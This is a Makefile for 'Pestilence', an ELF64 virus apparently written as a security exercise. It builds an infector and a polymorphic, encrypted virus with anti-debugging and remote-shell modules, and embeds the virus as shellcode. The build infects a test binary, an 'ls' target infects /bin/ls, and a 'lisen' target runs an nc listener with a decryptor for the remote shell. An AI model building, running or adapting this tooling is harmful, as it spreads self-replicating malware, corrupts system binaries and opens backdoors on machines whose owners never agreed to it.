NAME=Pestilence

PARAMS=--recur

DEBUG=0
DEBUG_EXT=0
FLAGS_IGNORE_WARNINGS=-Wno-unused-value -Wno-unused-variable -Wno-unused-parameter
FLAGS = -MD -fno-stack-protector -fPIC -fPIE -Wextra -Wall -fno-tree-loop-distribute-patterns -D DEBUG=$(DEBUG) -D DEBUG_EXT=$(DEBUG_EXT) $(FLAGS_IGNORE_WARNINGS)

SRC_DIR				= .
TMP_DIR				= .tmp
OBJ_DIR				= $(TMP_DIR)/obj

TABLE_C = $(TMP_DIR)/table.c
LIBFLAGS = -I lib/infect -I lib/ft_lib -I lib/crypto -I lib/formats -I lib/hacks -I lib/poly
VIRUS = virus

FTLIB_SRC = ft_io.c ft_string.c ft_lib.c call.s
FORMATS_SRC = elf64.c
CRYPTO_SRC = encrypt.c compress_use.c compress.c decrypt.c decrypt_block.s
HACKS_SRC = antidebug.c remote.c checkproc.c
INFECT_SRC = infect.c infect_dir.c
POLY_SRC = poly.c start.c garb.c

FTLIB = $(addprefix lib/ft_lib/, $(FTLIB_SRC))
FORMATS = $(addprefix lib/formats/, $(FORMATS_SRC))
CRYPTO = $(addprefix lib/crypto/, $(CRYPTO_SRC))
HACKS = $(addprefix lib/hacks/, $(HACKS_SRC))
INFECT = $(addprefix lib/infect/, $(INFECT_SRC))
POLY = $(addprefix lib/poly/, $(POLY_SRC))

OBJ_LIBS = $(addprefix $(OBJ_DIR)/, lib/ft_lib lib/ft_formats lib/crypto lib/hacks lib lib/poly)

SRC_C = virus/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(HACKS) $(POLY)
SRC_S = virus/start.s

OBJ_NO_TABLE=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(SRC_C)))) \
		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o))
OBJ =		$(OBJ_NO_TABLE) \
		$(addprefix $(OBJ_DIR)/, $(patsubst %.c,%.o,$(TABLE_C)))

SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(POLY)

OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(SRC_INF_C))))

DEP =		$(addprefix $(OBJ_DIR)/, $(OBJ:.o=.d)) \
		$(addprefix $(OBJ_DIR)/, $(OBJ_INF:.o=.d))

VIRUS = $(TMP_DIR)/virus.template
VIRUS_X = $(TMP_DIR)/virus_shellcode.c

LD_RULES = virus/rules.lds

all: $(NAME) fn_list

to_infect = $(TMP_DIR)/to_infect

$(NAME): $(VIRUS_X) $(OBJ_INF)
	gcc -o $(NAME) $(OBJ_INF) $(VIRUS_X)
	echo "int main(){return 0;}" > $(to_infect).c
	gcc $(to_infect).c -o $(to_infect)
	./$(NAME) --no-infect-dir $(PARAMS) $(ARGS) $(to_infect)
	mv $(NAME) .tmp/$(NAME)_infector
	mv $(to_infect) $(NAME)

$(VIRUS_X): $(VIRUS)
	cp $< virus_shellcode
	xxd -i virus_shellcode $(VIRUS_X)
	rm virus_shellcode

$(VIRUS): $(OBJ) $(LD_RULES)
	ld -o $@ -T $(LD_RULES) $(OBJ)
	nm -n .tmp/virus.template | grep ' B \| b ' | diff - /dev/null || rm $(VIRUS)

$(TMP_DIR):
	mkdir -p $@

$(OBJ_DIR):
	mkdir -p $@
	python -c 'import os,sys;dirs=[ r for r,s,f in os.walk(".") if r != "."];[os.makedirs(os.path.join(sys.argv[1],i)) for i in dirs]' $(OBJ_DIR)/.
	rm -rf $(OBJ_DIR)/others
	echo "0" > .tmp/total.tmp

##
## GARBAGE CODE
##

$(OBJ_DIR)/table.o: $(TABLE_C) | $(OBJ_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@

GARBAGE_CF = $(TMP_DIR)/garbage.txt
MODIF_CF = $(TMP_DIR)/modified.txt

fn_list: $(VIRUS)
	#nm --defined-only -n .tmp/virus.template | grep -v '\.' | cut -d ' ' -f 3 | sed -e '/^cmpr_start$$/,$$d' | grep -v DECRYPT_ROUTINE | grep -v ENCRYPT_ROUTINE | sort > fn_list
	nm --defined-only -n .tmp/virus.template | grep -v '\.' | cut -d ' ' -f 3 | grep -v DECRYPT_ROUTINE | grep -v ENCRYPT_ROUTINE | grep -v generate_garb | grep -v edit_ins | sort > fn_list

$(OBJ_DIR)/%.s: $(OBJ_DIR)/%.gs
	@cp $< $<.tmp
	@./others/scripts/add_garbage $< -p 10 -l toto $(shell cat fn_list) -sf .tmp/total.tmp || cp $< $@
	@cp $@ $@.tmp2

$(TABLE_C): $(OBJ_NO_TABLE)
	@nm $(OBJ_NO_TABLE) | grep .garb_start | wc -l > $(GARBAGE_CF)
	@nm $(OBJ_NO_TABLE) | grep .modif_start | wc -l > $(MODIF_CF)
	@./others/scripts/gen_table `cat $(GARBAGE_CF)` `cat $(MODIF_CF)` -o $@

$(OBJ_DIR)/%.o: $(OBJ_DIR)/%.s | $(OBJ_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@

$(OBJ_DIR)/%.gs: $(SRC_DIR)/%.c | $(OBJ_DIR) $(TMP_LIB_DIR)
	gcc -MD $(FLAGS) $(LIBFLAGS) -S $< -o $@

#$(OBJ_DIR)/%.s: $(SRC_DIR)/%.s | $(OBJ_DIR) $(TMP_LIB_DIR)
#	cp $< $@

##
## END
##

$(OBJ_DIR)/%.o: %.s | $(OBJ_DIR)
	nasm -f elf64 $< -o $@

clean:
	rm -rf $(TMP_DIR)

fclean: clean
	rm -rf $(NAME)

re: fclean
	echo $(DEP)
	make

-include $(DEP)

.PHONY: all re clean fclean test unit_test test_corruptor

test_corruptor: all
	echo 'int main(){printf("SALUT\\n");}' > /tmp/oki.c
	gcc /tmp/oki.c -o /tmp/oki
	(cd others/test && ./corruptor.sh ./../../$(NAME) /tmp/oki)


test: all
	(cd others/test && ./run.sh)

ls: all
	./$(NAME) /bin/ls

lisen:
	mkdir -p ./.tmp
	gcc remote_shell_decode.c -o ./.tmp/decript
	./.tmp/decript | nc -l -p 1234 | ./.tmp/decript
